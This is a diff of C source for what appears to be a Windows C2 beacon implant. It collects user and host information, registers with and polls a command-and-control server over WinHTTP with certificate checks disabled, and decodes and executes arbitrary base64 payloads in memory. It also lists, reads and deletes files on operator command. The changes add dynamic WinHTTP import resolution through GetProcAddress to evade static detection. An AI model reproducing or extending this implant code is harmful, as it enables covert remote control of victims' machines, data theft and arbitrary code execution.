@@ -13,9 +13,11 @@
 
 #include "../lib/json-c/json.h"
 
-// local 
+// local
 
 #include "base64.h"
+#include "imports.h"
+#include "strings.h"
 #include "compression.h"
 
 // core header file
@@ -54,7 +56,7 @@ BOOL GetBasicUserInfo(struct BasicUserInfo *UserInfo)
     {
         UserInfo->DomainName = "NULL";
     }
-    
+
     // set the computer name
 
     GetComputerNameA( ComputerBuf, &bufSize3 );
@@ -121,13 +123,13 @@ BOOL GetBasicCompInfo(struct BasicCompInfo *CompInfo)
         CompInfo->OS = "Windows Server 2012";
         return;
     }
-    
+
     CompInfo->OS = "Windows";
 
 }
 
 LPVOID CheckIfDie(LPCWSTR *ReadBuffer)
-{   
+{
 
     // get the 'alive' parameter of the json data and if its false... die
 
@@ -135,7 +137,7 @@ LPVOID CheckIfDie(LPCWSTR *ReadBuffer)
 
     parsed_json = json_tokener_parse(ReadBuffer);
     parsed_json = json_object_object_get(parsed_json, "alive");
-    
+
     if (parsed_json != NULL)
     {
         if (!json_object_get_boolean(parsed_json))
@@ -166,9 +168,12 @@ BOOL BeaconRegisterC2(LPCSTR CallbackAddress, INT CallbackPort, LPCSTR UserAgent
     HINTERNET           hSession = NULL, hConnect = NULL, hRequest = NULL;
     struct json_object *parsed_json;
 
-    // initiate the session
+    // get out close handle export
+    WinHttpCloseHandle_ rWinHttpCloseHandle = (WinHttpCloseHandle_)GetProcAddress(LoadLibrary(STRING_WINHTTP_DLL), STRING_WINHTTP_CLOSEH);
 
-    hSession = WinHttpOpen((LPCWSTR)UserAgent, WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
+    // initiate the session
+    WinHttpOpen_ rWinHttpOpen = (WinHttpOpen_)GetProcAddress(LoadLibrary(STRING_WINHTTP_DLL), STRING_WINHTTP_OPEN);
+    hSession = rWinHttpOpen((LPCWSTR)UserAgent, WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
 
     if (!hSession)
     {
@@ -177,45 +182,56 @@ BOOL BeaconRegisterC2(LPCSTR CallbackAddress, INT CallbackPort, LPCSTR UserAgent
     }
 
     // do the connection
-    hConnect = WinHttpConnect(hSession, (LPCWSTR)CallbackAddress, CallbackPort, 0);
+    WinHttpConnect_ rWinHttpConnect = (WinHttpConnect_)GetProcAddress(LoadLibrary(STRING_WINHTTP_DLL), STRING_WINHTTP_CONNECT);
+    hConnect = rWinHttpConnect(hSession, (LPCWSTR)CallbackAddress, CallbackPort, 0);
 
     if (!hConnect)
     {
-        // again, we cant do nothin so just go again later
+        rWinHttpCloseHandle(hSession);
+
         return FALSE;
     }
 
     // set up the request
-    hRequest = WinHttpOpenRequest(hConnect, L"POST", _REGISTER_URL, NULL, NULL, NULL, WINHTTP_FLAG_BYPASS_PROXY_CACHE | WINHTTP_FLAG_SECURE);
+    WinHttpOpenRequest_ rWinHttpOpenRequest = (WinHttpOpenRequest_)GetProcAddress(LoadLibrary(STRING_WINHTTP_DLL), STRING_WINHTTP_OPENREQ);
+    hRequest = rWinHttpOpenRequest(hConnect, L"POST", _REGISTER_URL, NULL, NULL, NULL, WINHTTP_FLAG_BYPASS_PROXY_CACHE | WINHTTP_FLAG_SECURE);
 
     if (!hRequest)
     {
-        // you get the idea by now
+        rWinHttpCloseHandle(hSession);
+        rWinHttpCloseHandle(hConnect);
+
         return FALSE;
     }
 
     // set the flags for our request, basically so we can connect when the c2 ssl cert is fucked
     flags = SECURITY_FLAG_IGNORE_UNKNOWN_CA | SECURITY_FLAG_IGNORE_CERT_DATE_INVALID | SECURITY_FLAG_IGNORE_CERT_CN_INVALID | SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE;
 
-    if (!WinHttpSetOption(hRequest, WINHTTP_OPTION_SECURITY_FLAGS, &flags, sizeof(flags)))
+    WinHttpSetOption_ rWinHttpSetOption = (WinHttpSetOption_)GetProcAddress(LoadLibrary(STRING_WINHTTP_DLL), STRING_WINHTTP_SETOPT);
+    if (!rWinHttpSetOption(hRequest, WINHTTP_OPTION_SECURITY_FLAGS, &flags, sizeof(flags)))
     {
-        // guess what...
+        rWinHttpCloseHandle(hRequest);
+        rWinHttpCloseHandle(hSession);
+        rWinHttpCloseHandle(hConnect);
+
         return FALSE;
     }
 
     // finally send the actual request to the c2
-    bResults = WinHttpSendRequest(hRequest, _POST_HEADER, _HEADER_LEN, (LPVOID)UriBuffer, strlen((char*)UriBuffer), strlen((char*)UriBuffer), 0);
+    WinHttpSendRequest_ rWinHttpSendRequest = (WinHttpSendRequest_)GetProcAddress(LoadLibrary(STRING_WINHTTP_DLL), STRING_WINHTTP_SENDREQ);
+    bResults = rWinHttpSendRequest(hRequest, _POST_HEADER, _HEADER_LEN, (LPVOID)UriBuffer, strlen((char*)UriBuffer), strlen((char*)UriBuffer), 0);
 
     // make sure the request was successful
     if (bResults)
-    {    
-        bResults = WinHttpReceiveResponse(hRequest, NULL);
+    {
+        WinHttpReceiveResponse_ rWinHttpReceiveResponse = (WinHttpReceiveResponse_)GetProcAddress(LoadLibrary(STRING_WINHTTP_DLL), STRING_WINHTTP_RECVRES);
+        bResults = rWinHttpReceiveResponse(hRequest, NULL);
     } else {
         if (GetLastError() & ERROR_WINHTTP_SECURE_FAILURE)
         {
             DEBUG("Failed to make callback");
         }
-        
+
         DEBUG("WinHttpSendRequest error: %d\n", GetLastError());
     }
 
@@ -224,30 +240,30 @@ BOOL BeaconRegisterC2(LPCSTR CallbackAddress, INT CallbackPort, LPCSTR UserAgent
     {
         do
         {
-            
-            if (!WinHttpQueryDataAvailable( hRequest, &dwSize))
+            WinHttpQueryDataAvailable_ rWinHttpQueryDataAvailable = (WinHttpQueryDataAvailable_)GetProcAddress(LoadLibrary(STRING_WINHTTP_DLL), STRING_WINHTTP_DATAAVA);
+            if (!rWinHttpQueryDataAvailable( hRequest, &dwSize))
             {
                 // Theres no data avalible
                 DEBUG("WinHttpQueryDataAvailable error\n");
                 return FALSE;
             }
 
-            if (!WinHttpReadData( hRequest, (LPVOID)ReadBuffer, dwSize, &dwDownloaded))
-            {                                  
+            WinHttpReadData_ rWinHttpReadData = (WinHttpReadData_)GetProcAddress(LoadLibrary(STRING_WINHTTP_DLL), STRING_WINHTTP_READATA);
+            if (!rWinHttpReadData( hRequest, (LPVOID)ReadBuffer, dwSize, &dwDownloaded))
+            {
                 // been an error
                 DEBUG("WinHttpReadData error\n");
                 return FALSE;
             }
 
         } while (dwSize > 0);
-        
+
     }
 
     // clean up the request stuffs now we are done with it.
-
-    WinHttpCloseHandle(hRequest);
-    WinHttpCloseHandle(hConnect);
-    WinHttpCloseHandle(hSession);
+    rWinHttpCloseHandle(hRequest);
+    rWinHttpCloseHandle(hSession);
+    rWinHttpCloseHandle(hConnect);
 
     // now its time to parse the json data in the responce
     parsed_json = json_tokener_parse(ReadBuffer);
@@ -280,10 +296,10 @@ LPCSTR* BuildCheckinData(DWORD OpCode, LPCSTR Data, DWORD Mode)
     switch (Mode)
     {
     case MODE_CHECKIN_NO_DATA:
-    
-        // dont add any data  
+
+        // dont add any data
         break;
-    
+
     case MODE_CHECKIN_DATA:
 
         // add the opcode and data to the json data
@@ -291,7 +307,7 @@ LPCSTR* BuildCheckinData(DWORD OpCode, LPCSTR Data, DWORD Mode)
         json_object_object_add(jobj, "data", json_object_new_string(Data));
 
         break;
-    
+
     default:
         break;
     }
@@ -324,9 +340,12 @@ LPCWSTR* BeaconCallbackC2(LPCSTR CallbackAddress, INT CallbackPort, LPCSTR UserA
         UriBuffer = (LPCSTR*)malloc(SendBufferSize * 2);
     }
 
-    // initiate the session
+    // get out close handle export
+    WinHttpCloseHandle_ rWinHttpCloseHandle = (WinHttpCloseHandle_)GetProcAddress(LoadLibrary(STRING_WINHTTP_DLL), STRING_WINHTTP_CLOSEH);
 
-    hSession = WinHttpOpen((LPCWSTR)UserAgent, WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
+    // initiate the session
+    WinHttpOpen_ rWinHttpOpen = (WinHttpOpen_)GetProcAddress(LoadLibrary(STRING_WINHTTP_DLL), STRING_WINHTTP_OPEN);
+    hSession = rWinHttpOpen((LPCWSTR)UserAgent, WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
 
     if (!hSession)
     {
@@ -335,22 +354,25 @@ LPCWSTR* BeaconCallbackC2(LPCSTR CallbackAddress, INT CallbackPort, LPCSTR UserA
     }
 
     // do the connection
-
-    hConnect = WinHttpConnect(hSession, (LPCWSTR)CallbackAddress, CallbackPort, 0);
+    WinHttpConnect_ rWinHttpConnect = (WinHttpConnect_)GetProcAddress(LoadLibrary(STRING_WINHTTP_DLL), STRING_WINHTTP_CONNECT);
+    hConnect = rWinHttpConnect(hSession, (LPCWSTR)CallbackAddress, CallbackPort, 0);
 
     if (!hConnect)
     {
-        // again, we cant do nothin so just go again later
+        rWinHttpCloseHandle(hSession);
+
         return FALSE;
     }
 
     // set up the request
-
-    hRequest = WinHttpOpenRequest(hConnect, L"POST", _CALLBACK_URL, NULL, NULL, NULL, WINHTTP_FLAG_BYPASS_PROXY_CACHE | WINHTTP_FLAG_SECURE);
+    WinHttpOpenRequest_ rWinHttpOpenRequest = (WinHttpOpenRequest_)GetProcAddress(LoadLibrary(STRING_WINHTTP_DLL), STRING_WINHTTP_OPENREQ);
+    hRequest = rWinHttpOpenRequest(hConnect, L"POST", _CALLBACK_URL, NULL, NULL, NULL, WINHTTP_FLAG_BYPASS_PROXY_CACHE | WINHTTP_FLAG_SECURE);
 
     if (!hRequest)
     {
-        // you get the idea by now
+        rWinHttpCloseHandle(hSession);
+        rWinHttpCloseHandle(hConnect);
+
         return FALSE;
     }
 
@@ -358,9 +380,13 @@ LPCWSTR* BeaconCallbackC2(LPCSTR CallbackAddress, INT CallbackPort, LPCSTR UserA
 
     flags = SECURITY_FLAG_IGNORE_UNKNOWN_CA | SECURITY_FLAG_IGNORE_CERT_DATE_INVALID | SECURITY_FLAG_IGNORE_CERT_CN_INVALID | SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE;
 
-    if (!WinHttpSetOption(hRequest, WINHTTP_OPTION_SECURITY_FLAGS, &flags, sizeof(flags)))
+    WinHttpSetOption_ rWinHttpSetOption = (WinHttpSetOption_)GetProcAddress(LoadLibrary(STRING_WINHTTP_DLL), STRING_WINHTTP_SETOPT);
+    if (!rWinHttpSetOption(hRequest, WINHTTP_OPTION_SECURITY_FLAGS, &flags, sizeof(flags)))
     {
-        // guess what...
+        rWinHttpCloseHandle(hRequest);
+        rWinHttpCloseHandle(hSession);
+        rWinHttpCloseHandle(hConnect);
+
         return FALSE;
     }
 
@@ -376,35 +402,37 @@ LPCWSTR* BeaconCallbackC2(LPCSTR CallbackAddress, INT CallbackPort, LPCSTR UserA
     }
 
     // finally send the actual request to the c2
-
-    bResults = WinHttpSendRequest(hRequest, _POST_HEADER, _HEADER_LEN, (LPVOID)UriBuffer, strlen((char*)UriBuffer), strlen((char*)UriBuffer), 0);
+    WinHttpSendRequest_ rWinHttpSendRequest = (WinHttpSendRequest_)GetProcAddress(LoadLibrary(STRING_WINHTTP_DLL), STRING_WINHTTP_SENDREQ);
+    bResults = rWinHttpSendRequest(hRequest, _POST_HEADER, _HEADER_LEN, (LPVOID)UriBuffer, strlen((char*)UriBuffer), strlen((char*)UriBuffer), 0);
 
     // make sure the request was successful
 
     if (bResults)
-    {       
-        bResults = WinHttpReceiveResponse(hRequest, NULL);
+    {
+        WinHttpReceiveResponse_ rWinHttpReceiveResponse = (WinHttpReceiveResponse_)GetProcAddress(LoadLibrary(STRING_WINHTTP_DLL), STRING_WINHTTP_RECVRES);
+        bResults = rWinHttpReceiveResponse(hRequest, NULL);
     }
 
     if (bResults)
-    {  
+    {
         DWORD dwSize = 0;
         DWORD dwDownloaded = 0;
         LPSTR pszOutBuffer;
 
         ResBuffer = "";
 
-        do 
+        do
         {
             // check how much available data there is
 
             dwSize = 0;
-            if (!WinHttpQueryDataAvailable( hRequest, &dwSize)) 
+            WinHttpQueryDataAvailable_ rWinHttpQueryDataAvailable = (WinHttpQueryDataAvailable_)GetProcAddress(LoadLibrary(STRING_WINHTTP_DLL), STRING_WINHTTP_DATAAVA);
+            if (!rWinHttpQueryDataAvailable( hRequest, &dwSize))
             {
                 DEBUG( "Error %u in WinHttpQueryDataAvailable.\n", GetLastError());
                 break;
             }
-            
+
             // out of data
 
             if (!dwSize)
@@ -421,13 +449,14 @@ LPCWSTR* BeaconCallbackC2(LPCSTR CallbackAddress, INT CallbackPort, LPCSTR UserA
                 DEBUG("Out of memory\n");
                 break;
             }
-            
+
             // read all the data
 
             ZeroMemory(pszOutBuffer, dwSize + 1);
 
-            if (!WinHttpReadData( hRequest, (LPVOID)pszOutBuffer, dwSize, &dwDownloaded))
-            {                                  
+            WinHttpReadData_ rWinHttpReadData = (WinHttpReadData_)GetProcAddress(LoadLibrary(STRING_WINHTTP_DLL), STRING_WINHTTP_READATA);
+            if (!rWinHttpReadData( hRequest, (LPVOID)pszOutBuffer, dwSize, &dwDownloaded))
+            {
                 // been an error
                 return FALSE;
             }
@@ -435,11 +464,11 @@ LPCWSTR* BeaconCallbackC2(LPCSTR CallbackAddress, INT CallbackPort, LPCSTR UserA
             {
                 asprintf(&ResBuffer, "%s%s", ResBuffer, pszOutBuffer);
             }
-        
+
             // free the memory allocated to the buffer.
 
             free(pszOutBuffer);
-                
+
         } while (dwSize > 0);
     }
 
@@ -467,7 +496,7 @@ BOOL ExecuteCode(char* Base64Buffer, BOOL CodeType)
     size_t b64_len   = b64_decoded_size(Base64Buffer);
     char*  b64_out   = (char*)malloc(out_len);
 
-    b64_out = base64_decode((const char*)Base64Buffer, out_len - 1, &out_len);    
+    b64_out = base64_decode((const char*)Base64Buffer, out_len - 1, &out_len);
 
     DEBUG("Calling ExecuteMemory");
 
@@ -476,11 +505,11 @@ BOOL ExecuteCode(char* Base64Buffer, BOOL CodeType)
     case TRUE:
         // execute module
         return ExecuteMemory(b64_out, b64_len, TRUE);
-    
+
     case FALSE:
         // execute arbitary user code
         return ExecuteMemory(b64_out, b64_len, FALSE);
-    
+
     default:
         return FALSE;
     }
@@ -491,7 +520,7 @@ BOOL Stdlib(char* Buffer)
     char* data = NULL;
     DWORD rOpCode;
     struct json_object *parsed_json;
-    
+
     parsed_json = json_tokener_parse(Buffer);
     parsed_json = json_object_object_get(parsed_json, "op");
     int op = json_object_get_int(parsed_json);
@@ -506,27 +535,27 @@ BOOL Stdlib(char* Buffer)
     case 0x1000:
         data = listdirs(args);
         break;
-    
+
     case 0x2000:
         data = readfile(args);
         break;
-    
+
     case 0x3000:
         data = getdir();
         break;
-    
+
     case 0x4000:
         data = removefile(args);
         break;
-    
+
     case 0x5000:
         data = makedirectory(args);
         break;
-    
+
     case 0x6000:
         data = changedir(args);
         break;
-    
+
     // I have no idea why this doesnt work.
     // case 0x7000:
     //     // rewrite
